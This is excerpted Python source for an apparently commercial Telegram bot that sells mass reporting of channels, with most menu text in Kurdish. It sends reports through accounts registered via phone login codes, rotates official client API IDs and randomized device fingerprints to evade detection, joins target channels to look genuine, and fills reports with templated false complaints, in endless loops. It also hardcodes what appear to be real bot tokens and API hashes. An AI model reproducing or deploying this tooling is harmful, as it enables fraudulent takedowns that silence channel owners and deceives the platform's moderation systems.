...
# ─── Configuration ───────────────────────────────────────────────────────
BOT_TOKEN = "8937034293:AAFoR3Jq0Kw3_6ZezI6W00fGz_qHyieCDPQ"
OWNER_ID = 6019063884
DB_FILE = "panel_bot.db"

# API Credentials
API_ID = 38609145
API_HASH = "f0d14f36d9836bf3cbc95c8cebed7f1e"

# OFFICIAL API ID POOL (Android, iOS, Desktop)
# Rotating these makes the reports look like they come from different official apps
API_POOL = [
    (38609145, "f0d14f36d9836bf3cbc95c8cebed7f1e"), # Default
    (6, "eb06d4ab352a55977a4194c39832c324"),        # Official Android
    (2040, "b18441a1ed607c10e7a052d73d12a691"),    # Official Desktop
    (10840, "33c45224552ca4a99e45030f3543b35f"),   # Official iOS
]
...
T = {'welcome': {'ku': '👋 بەخێر بێیت!\n'
 ...
 'purchase_history': {'ku': '📜 مێژووی کڕین'},
...
def user_main_menu(user_id=None):
    ...
    return InlineKeyboardMarkup([
        ...
        [InlineKeyboardButton(t(uid, "settings"), callback_data="user_settings")],
    ])
...
def balance_menu_user(user_id=None):
    uid = user_id or 0
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(t(uid, "purchase_history"), callback_data="balance_history")],
...
def owner_balance_menu_kb(user_id=None):
    uid = user_id or OWNER_ID
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(t(uid, "add_balance"), callback_data="owner_add_balance")],
        [InlineKeyboardButton(t(uid, "set_balance"), callback_data="owner_set_balance")],
        [InlineKeyboardButton(t(uid, "reset_balance"), callback_data="owner_reset_balance")],
        [InlineKeyboardButton(t(uid, "back"), callback_data="owner_main")],
    ])
...
def settings_menu_kb(user_id):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(t(user_id, "logout"), callback_data="settings_logout")],
...
def init_db():
    ...
    new_cols = [
        ...
        ('lang_code', 'TEXT'), ('system_lang_code', 'TEXT')
    ]
...
def set_registered(user_id, phone=""):
    """Mark user as registered"""
    conn = get_db()
    conn.execute("UPDATE users SET registered = 1, phone = ? WHERE id = ?", (phone, user_id))
    conn.commit()
    conn.close()
...
async def send_code_to_phone(user_id, phone):
    """Send Telegram login code to phone number using API pool for better reliability"""
    ...
    # Pick a random official API from the pool to avoid Telegram data-center flagging
...
REASON_CODES = {
    ...
    'hack': types.InputReportReasonOther(),
    ...
    'abuse': types.InputReportReasonPersonalDetails(),
...
async def _send_one_report(section, channel_username, message_ids, report_reason):
    """Send a single report using one section"""
    ...
    async with section_locks[session_id]:
        ...
        if not session_string:
            print("[-] REPORT DIAGNOSTIC: session_string empty")
            return False, "session_string empty"

        client = None
        _retry_left = 1  # one reconnect attempt on transient MTProto errors
        while True:
            try:
                # The session string may have been cleaned/stored without padding;
                # always re-clean it on each use so stored junk doesn't break auth.
                if session_string:
                    session_string = _clean_session_string(session_string)
                # --- CONSISTENT IDENTITY LOGIC ---
                # We check if this section already has device info saved. 
                # If not, we generate it once and save it to the DB so it stays consistent.
                ...
                needs_update = False
                if not device_model:
                    device_model = random.choice(['iPhone 13 Pro', 'iPhone 15 Pro Max', 'Samsung Galaxy S23', 'Pixel 7 Pro', 'iPad Pro', 'Redmi Note 12'])
                    needs_update = True
                if not system_version:
                    system_version = random.choice(['iOS 16.5', 'iOS 17.1', 'Android 13', 'Android 14', 'Windows 11'])
                    needs_update = True
                if not app_version:
                    app_version = random.choice(['9.6.5', '10.0.1', '10.2.0', '10.5.0'])
                    needs_update = True
                if not lang_code:
                    lang_code = random.choice(['en', 'ku', 'ar', 'ru', 'tr', 'de'])
                    needs_update = True
                if not system_lang:
                    system_lang = random.choice(['en-US', 'en-GB', 'ar-SA', 'ru-RU'])
                    needs_update = True
                if not s_api_id:
                    s_api_id, s_api_hash = random.choice(API_POOL)
                    needs_update = True
                ...
                # 4. Join the channel for stronger reports (more impactful)
                try:
                    from telethon.tl.functions.channels import JoinChannelRequest
                    await client(JoinChannelRequest(entity))
                    # Small wait after joining to look like a real user
                    await asyncio.sleep(random.uniform(2, 5))
                except Exception:
                    pass
                ...
                # --- AI-POWERED VARIED COMPLAINTS ---
                complaints = [
                    f"This channel violates Telegram Terms of Service. Specifically: {reason_label}.",
                    f"Reporting for {reason_label}. This content is harmful and should be removed.",
                    f"Serious violation detected: {reason_label}. Please review this channel immediately.",
                    f"The content in this channel is {reason_label.lower()} and violates community standards.",
                    f"User safety concern: this peer is engaging in {reason_label.lower()}.",
                    f"Illegal activity detected. Reason: {reason_label}.",
                    f"Spam and {reason_label.lower()} activity from this channel. Requesting ban."
                ]
                final_complaint = random.choice(complaints)

                # Final step: send the report
...
async def send_reports_core(link, rtype, max_reports, section_count=-1, endless=False, 
    ...
    channel_username = link.split("t.me/")[-1] if "t.me/" in link else link.replace("@", "")
    channel_username = channel_username.strip().rstrip("/")
    
    report_reason = REASON_CODES.get(rtype, REASON_CODES['spam'])
    
    # Message IDs are no longer needed for account.reportPeer
    message_ids = []
    ...
    try:
        while (total_attempted < max_reports) if max_reports > 0 else True:
            ...
            total_attempted += 1
            print(f"[+] Sending sequential report {total_attempted} using section {section['name']}...")
            ok, err = await _send_one_report(section, channel_username, [], current_reason)
...
async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    # ── PROTECTION: Check if registered ──
    if state not in ("reg_phone", "reg_code", "reg_password") and not is_owner(user_id):
        if not is_registered(user_id) or is_logged_out(user_id):
            await update.message.reply_text(
                t(user_id, "not_registered"),
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton(t(user_id, "register_btn"), callback_data="register")
                ]])
            )
            return
    ...
    # ── No matching state ──
    if not is_owner(user_id) and (not is_registered(user_id) or is_logged_out(user_id)):
        await update.message.reply_text(
            t(user_id, "not_registered"),
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton(t(user_id, "register_btn"), callback_data="register")
...
async def handle_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    # ── PROTECTION: Check registration for all buttons except register ──
    if data not in ("register", "reg_phone") and not is_owner(user_id):
        if not is_registered(user_id) or is_logged_out(user_id):
    ...
    if data == "register":
        ...
        # If logged out, allow re-registration without new session sent
    ...
    if data == "balance_history":
        ...
        history = conn.execute(
            "SELECT * FROM reports WHERE user_id = ? ORDER BY created_at DESC LIMIT 3", (user_id,)
        ).fetchall()
        conn.close()
        
        if not history:
            text = "📜 هیچ مێژوویەکی کڕین نییە."
            keyboard = [
                [InlineKeyboardButton(t(user_id, "back"), callback_data="user_account")],
            ]
        else:
            text = "🧾 <b>مێژووی کڕین</b>\n\n"
            for h in history:
                status_icon = "✅" if h['status'] == 'completed' else '⏳'
                target_link = html.escape(str(h['target_link'] or ''))
                report_type = html.escape(str(h['report_type'] or ''))
                created_at = html.escape(str(h['created_at'] or ''))
                report_count = h['report_count'] or 0
                cost = h['cost'] or 0
                text += (
                    f"📌 <b>داواکاری</b> {status_icon}\n"
                    f"📅 کاتی کڕین: <code>{created_at}</code>\n"
                    f"💰 بڕی پارە: <b>{cost:,}</b> دینار\n"
                    f"📊 ژمارەی ڕیپۆرت: <b>{report_count}</b>\n"
                    f"🏷️ جۆر: {report_type}\n"
                    f"🔗 لینک: {target_link}\n\n"
                )
            keyboard = [
                [InlineKeyboardButton(t(user_id, "top_up"), callback_data="balance_topup")],
                [InlineKeyboardButton(t(user_id, "back"), callback_data="user_account")],
            ]
...
async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    # Not registered or logged out: show registration
    if is_logged_out(user_id):
        await update.message.reply_text(
            t(user_id, "welcome_logged_out"),
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton(t(user_id, "register_btn"), callback_data="register")
            ]])
        )
